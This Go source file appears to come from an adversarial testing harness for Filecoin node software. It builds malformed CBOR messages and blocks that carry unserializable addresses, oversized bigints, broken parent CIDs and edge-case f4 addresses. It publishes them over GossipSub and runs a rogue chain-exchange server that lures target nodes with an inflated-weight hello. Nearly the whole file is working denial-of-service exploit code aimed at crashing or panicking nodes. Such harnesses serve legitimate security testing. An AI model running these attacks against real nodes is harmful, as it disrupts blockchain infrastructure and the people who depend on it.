package main

import (
	"context"
	"io"
	"log"
	"time"

	"github.com/ipfs/go-cid"
	"github.com/libp2p/go-libp2p/core/network"
)

func getAllRoundTripAttacks() []namedAttack {
	return []namedAttack{
		// GossipSub-delivered round-trip bombs
		{name: "msgs/all-signed-message-with-unserializable-address", fn: roundtripAddrGossipMsg},
		{name: "blocks/all-block-with-unserializable-miner-address", fn: roundtripAddrGossipBlock},
		{name: "msgs/all-signed-message-with-unserializable-bigint", fn: roundtripBigIntGossipMsg},
		{name: "msgs/all-signed-message-with-unserializable-address-and-bigint", fn: roundtripCombinedBombMsg},
		{name: "msgs/forest-signed-message-with-unserializable-address", fn: roundtripForestAddrUnwrap},
	}
}

func getAllRoundTripExchangeAttacks() []namedAttack {
	return []namedAttack{
		{name: "exchange/all-block-with-unserializable-message-address", targetedFn: func(t TargetNode) { runRoundTripAddrExchange(ctx, t) }, targetType: nodeAny},
		{name: "exchange/all-block-with-unserializable-bigint-fields", targetedFn: func(t TargetNode) { runRoundTripBigIntExchange(ctx, t) }, targetType: nodeAny},
		{name: "exchange/all-block-with-unserializable-parent-cids", targetedFn: func(t TargetNode) { runRoundTripCIDExchange(ctx, t) }, targetType: nodeAny},
	}
}

func getAllFVMAddressAttacks() []namedAttack {
	return []namedAttack{
		{name: "msgs/forest-signed-message-with-f4-delegated-address", fn: forestFVMF4GossipMsg},
		{name: "blocks/forest-block-with-f4-delegated-miner-address", fn: forestFVMF4GossipBlock},
		{name: "msgs/forest-signed-message-with-mixed-f4-and-f0-addresses", fn: forestFVMMixedAddrs},
		{name: "msgs/forest-signed-message-with-edge-case-f4-namespace", fn: forestFVMNamespaceEdge},
		{name: "msgs/forest-signed-message-with-f4-address-in-params", fn: forestFVMF4InParams},
		{name: "exchange/forest-block-with-f4-delegated-message-address", targetedFn: func(t TargetNode) { runForestFVMF4Exchange(ctx, t) }, targetType: nodeForest},
	}
}

// ---------------------------------------------------------------------------
// Family 1: Serialization round-trip attacks
// ---------------------------------------------------------------------------

func roundtripAddrGossipMsg() {
	addr := generateRoundTripBombAddress()
	msg := buildMessageCBOR(addr)
	sig := append([]byte{0x01}, randomBytes(65)...)
	data := buildSignedMessageCBOR(msg, sig)
	log.Printf("[roundtrip] addr-gossip-msg: %d bytes to /fil/msgs/", len(data))
	publishMsg(data)
}

func roundtripAddrGossipBlock() {
	headInfo := fetchChainHead(rngChoice(targets).Name)
	opts := blockHeaderOpts{overrideMiner: generateRoundTripBombAddress()}
	if headInfo != nil {
		opts.overrideParentCIDs = headInfo.CIDs
		opts.overrideHeight = headInfo.Height + 1
		opts.overrideWeight = 999999999
	}
	header := buildBlockHeaderCBOR(opts)
	data := cborArray(header, cborArray(), cborArray())
	log.Printf("[roundtrip] addr-gossip-block: %d bytes to /fil/blocks/", len(data))
	publishBlock(data)
}

func roundtripBigIntGossipMsg() {
	bombVal := generateRoundTripBombBigInt()
	msg := buildMessageCBORWithBigInt(bombVal)
	sig := append([]byte{0x01}, randomBytes(65)...)
	data := buildSignedMessageCBOR(msg, sig)
	log.Printf("[roundtrip] bigint-gossip-msg: %d bytes to /fil/msgs/", len(data))
	publishMsg(data)
}

func roundtripCombinedBombMsg() {
	addr := generateRoundTripBombAddress()
	bombVal := generateRoundTripBombBigInt()
	addrCBOR := cborBytes(addr)
	msg := cborArray(
		cborUint64(0), addrCBOR, addrCBOR, cborUint64(0),
		cborBytes(bombVal), cborInt64(1000000),
		cborBytes(bigIntBytes(100)), cborBytes(bigIntBytes(100)),
		cborUint64(0), cborBytes(nil),
	)
	sig := append([]byte{0x01}, randomBytes(65)...)
	data := buildSignedMessageCBOR(msg, sig)
	log.Printf("[roundtrip] combined-bomb-msg: %d bytes to /fil/msgs/", len(data))
	publishMsg(data)
}

func roundtripForestAddrUnwrap() {
	addr := generateRoundTripBombAddress()
	msg := buildMessageCBOR(addr)
	sig := append([]byte{0x01}, randomBytes(65)...)
	data := buildSignedMessageCBOR(msg, sig)
	log.Printf("[roundtrip] forest-addr-unwrap: %d bytes to /fil/msgs/", len(data))
	publishMsg(data)
}

func runRoundTripAddrExchange(ctx contextType, target TargetNode) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		return
	}
	addr := generateRoundTripBombAddress()
	msgs := buildCompactedMsgsWithBombMsg(addr)
	blockCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
		overrideParentCIDs: headInfo.CIDs,
		overrideHeight:     headInfo.Height + 1,
		overrideWeight:     999999999,
	})
	resp := okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, msgs))
	runGenericExchangeServerAttack(ctx, target, "roundtrip-addr-exchange", resp, blockCBOR)
}

func runRoundTripBigIntExchange(ctx contextType, target TargetNode) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		return
	}
	bombVal := generateRoundTripBombBigInt()
	fields := buildDefaultHeaderFields()
	fields[6] = cborBytes(bombVal)  // ParentWeight
	fields[15] = cborBytes(bombVal) // ParentBaseFee
	if headInfo != nil {
		fields[5] = cborCIDArray(headInfo.CIDs)
		fields[7] = cborUint64(headInfo.Height + 1)
	}
	blockCBOR := cborArray(fields...)
	resp := okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, buildEmptyCompactedMsgsCBOR()))
	runGenericExchangeServerAttack(ctx, target, "roundtrip-bigint-exchange", resp, blockCBOR)
}

func runRoundTripCIDExchange(ctx contextType, target TargetNode) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		return
	}
	// Malformed parent CID
	fields := buildDefaultHeaderFields()
	var malformedParent []byte
	malformedParent = append(malformedParent, 0x01, 0x71) // CIDv1 dag-cbor prefix
	malformedParent = append(malformedParent, 0x12, 0x20) // sha2-256, 32 bytes
	malformedParent = append(malformedParent, randomBytes(31)...) // only 31 bytes (need 32)

	var parentsCBOR []byte
	parentsCBOR = append(parentsCBOR, cborArray(cborCID(randomCID()))...) // use normal CID as base
	// Overwrite with raw construction for malformed CID
	var buf []byte
	buf = append(buf, 0x81) // array(1)
	buf = append(buf, 0xD8, 0x2A) // tag(42)
	tagged := append([]byte{0x00}, malformedParent...)
	buf = append(buf, cborBytes(tagged)...)
	fields[5] = buf

	if headInfo != nil {
		fields[7] = cborUint64(headInfo.Height + 1)
	}
	blockCBOR := cborArray(fields...)
	resp := okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, buildEmptyCompactedMsgsCBOR()))
	runGenericExchangeServerAttack(ctx, target, "roundtrip-cid-exchange", resp, blockCBOR)
}

// ---------------------------------------------------------------------------
// Family 2: Forest FVM address version panics
// ---------------------------------------------------------------------------

func forestFVMF4GossipMsg() {
	namespaces := []uint64{10, 1, 42, 0}
	ns := namespaces[rngIntn(len(namespaces))]
	subLen := 20 + rngIntn(13) // 20-32 bytes
	addr := generateF4Address(ns, subLen)
	msg := buildMessageCBOR(addr)
	sig := append([]byte{0x01}, randomBytes(65)...)
	data := buildSignedMessageCBOR(msg, sig)
	log.Printf("[forest-fvm] f4-gossip-msg: ns=%d subLen=%d, %d bytes", ns, subLen, len(data))
	publishMsg(data)
}

func forestFVMF4GossipBlock() {
	headInfo := fetchChainHead(rngChoice(targets).Name)
	addr := generateF4Address(10, 20)
	opts := blockHeaderOpts{overrideMiner: addr}
	if headInfo != nil {
		opts.overrideParentCIDs = headInfo.CIDs
		opts.overrideHeight = headInfo.Height + 1
		opts.overrideWeight = 999999999
	}
	header := buildBlockHeaderCBOR(opts)
	data := cborArray(header, cborArray(), cborArray())
	log.Printf("[forest-fvm] f4-gossip-block: %d bytes", len(data))
	publishBlock(data)
}

func forestFVMMixedAddrs() {
	f4Addr := cborBytes(generateF4Address(10, 20))
	f0Addr := cborBytes([]byte{0x00, 0xe8, 0x07})
	msg := cborArray(
		cborUint64(0), f4Addr, f0Addr, cborUint64(0),
		cborBytes(bigIntBytes(0)), cborInt64(1000000),
		cborBytes(bigIntBytes(100)), cborBytes(bigIntBytes(100)),
		cborUint64(0), cborBytes(nil),
	)
	sig := append([]byte{0x01}, randomBytes(65)...)
	data := buildSignedMessageCBOR(msg, sig)
	log.Printf("[forest-fvm] mixed-addrs: %d bytes", len(data))
	publishMsg(data)
}

func forestFVMNamespaceEdge() {
	namespaces := []uint64{0, 1<<63 - 1, 1<<32 - 1, 255}
	ns := namespaces[rngIntn(len(namespaces))]
	subLens := []int{0, 1, 20, 54, 128}
	sl := subLens[rngIntn(len(subLens))]
	addr := generateF4Address(ns, sl)
	msg := buildMessageCBOR(addr)
	sig := append([]byte{0x01}, randomBytes(65)...)
	data := buildSignedMessageCBOR(msg, sig)
	log.Printf("[forest-fvm] namespace-edge: ns=%d subLen=%d, %d bytes", ns, sl, len(data))
	publishMsg(data)
}

func forestFVMF4InParams() {
	f4Addr := generateF4Address(10, 20)
	validAddr := cborBytes([]byte{0x00, 0xe8, 0x07})
	msg := cborArray(
		cborUint64(0), validAddr, validAddr, cborUint64(0),
		cborBytes(bigIntBytes(0)), cborInt64(10000000),
		cborBytes(bigIntBytes(100)), cborBytes(bigIntBytes(100)),
		cborUint64(3), // Method > 0 to signal params
		cborBytes(f4Addr),
	)
	sig := append([]byte{0x01}, randomBytes(65)...)
	data := buildSignedMessageCBOR(msg, sig)
	log.Printf("[forest-fvm] f4-in-params: %d bytes", len(data))
	publishMsg(data)
}

func runForestFVMF4Exchange(ctx contextType, target TargetNode) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		return
	}
	addr := generateF4Address(10, 20)
	msgs := buildCompactedMsgsWithBombMsg(addr)
	blockCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
		overrideParentCIDs: headInfo.CIDs,
		overrideHeight:     headInfo.Height + 1,
		overrideWeight:     999999999,
	})
	resp := okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, msgs))
	runGenericExchangeServerAttack(ctx, target, "fvm-f4-exchange", resp, blockCBOR)
}

// ---------------------------------------------------------------------------
// Generic exchange server attack helper
// ---------------------------------------------------------------------------

type contextType = context.Context

func runGenericExchangeServerAttack(ctx contextType, target TargetNode, id string, resp []byte, triggerBlockCBOR []byte) {
	triggerCID := blockCIDFromCBOR(triggerBlockCBOR)

	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[%s] create host failed: %v", id, err)
		return
	}
	defer h.Close()

	served := make(chan struct{}, 1)

	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
		defer s.Close()
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(resp)
		select {
		case served <- struct{}{}:
		default:
		}
	})

	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(cborArray(cborInt64(0), cborInt64(0)))
		s.Close()
	})

	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[%s] connect failed: %v", id, err)
		return
	}

	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		return
	}
	genesis := parseGenesisCID()
	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
		[]cid.Cid{triggerCID}, headInfo.Height+1, 999999999, genesis,
	))

	select {
	case <-served:
		log.Printf("[%s] response served to %s", id, target.Name)
	case <-time.After(15 * time.Second):
		debugLog("[%s] timeout on %s", id, target.Name)
	}
}
